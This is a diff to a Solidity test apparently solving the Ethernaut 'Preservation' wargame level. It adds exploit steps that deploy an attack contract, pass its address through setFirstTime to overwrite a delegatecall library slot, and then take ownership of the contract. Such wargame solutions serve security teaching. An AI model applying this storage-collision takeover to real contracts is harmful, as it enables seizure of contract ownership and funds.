@@ -1,7 +1,7 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../Preservation/PreservationHack.sol";
+import "../Preservation/PreservationHackDan.sol";
 import "../Preservation/PreservationFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
@@ -29,6 +29,13 @@ contract PreservationTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+        PreservationHackDan hack = new PreservationHackDan(tx.origin);
+        // Doesn't matter if you call first time or second time
+        ethernautPreservation.setFirstTime(uint256(uint160(address(hack))));
+        // Number no longer matters here
+        ethernautPreservation.setFirstTime(123_456);
+
+        assertEq(ethernautPreservation.owner(), tx.origin, "Wrong owner");
 
         //////////////////////
         // LEVEL SUBMISSION //
